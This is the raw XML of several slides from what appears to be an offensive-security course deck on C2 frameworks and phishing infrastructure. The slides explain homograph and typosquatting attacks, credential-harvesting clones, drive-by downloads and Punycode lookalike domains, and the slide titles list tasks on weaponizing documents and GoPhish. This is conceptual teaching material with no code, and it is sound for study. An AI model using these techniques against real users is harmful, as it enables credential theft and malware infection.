        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15762057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marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>Because the attacker can obtain a valid TLS/SSL certificate for the spoofed domain, the browser will show a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>secure padlock</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t> – even though the victim is visiting a completely malicious site. This makes homograph attacks extremely dangerous.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>3. How Attackers Weaponize </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0" err="1"/>
              <a:t>Typosquatting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t> &amp; Homograph Attacks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>3.1 Phishing &amp; Credential Theft</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>The attacker uses the registered domain to host a perfect clone of the legitimate site's login portal. When the victim mistypes the URL (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0" err="1"/>
              <a:t>typosquatting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>) or clicks a link (homograph attack), they land on the fake portal and enter their credentials, which are captured in real time.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>3.2 Drive‑by Downloads &amp; Malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Beyond credential theft, an attacker can embed a drive‑by download kit on the landing page that silently exploits browser vulnerabilities and installs malware, ransomware, or remote access trojans (RATs).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14125075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0"/>
            <a:ext cx="11930743" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>3.3 Phishing via Punycode in Ads</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Modern browsers translate raw Punycode (the encoded form </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>xn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>--80ak6aa92e.com) into readable form (e.g., аррӏе.com) using an API called Punycode. Attackers have been observed using Punycode in Google Ads to make their malicious URLs look authentic.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8809797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039600" cy="6858000"/>
          </a:xfrm>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                                                  Thank you</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4121257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1431</TotalTime>
  <Words>7200</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>532</Paragraphs>
  <Slides>50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50</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="55" baseType="lpstr">
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Calibri Light</vt:lpstr>
      <vt:lpstr>quote-cjk-patch</vt:lpstr>
      <vt:lpstr>Office Theme</vt:lpstr>
      <vt:lpstr>Week 10</vt:lpstr>
      <vt:lpstr>Week 10: C2 Frameworks &amp; Phishing Infrastructure </vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Task 02 Weaponizing Documents &amp; Payloads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Task 03: Phishing Infrastructure with GoPhish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Task 04: Domain Spoofing &amp; SMTP Fundamentals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Homoglyph examples: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10</dc:title>
  <dc:creator>Gh0stRift</dc:creator>
  <cp:lastModifiedBy>Gh0stRift</cp:lastModifiedBy>
  <cp:revision>67</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-04-27T10:03:30Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-08-23T04:24:06Z</dcterms:modified>
</cp:coreProperties>
</file>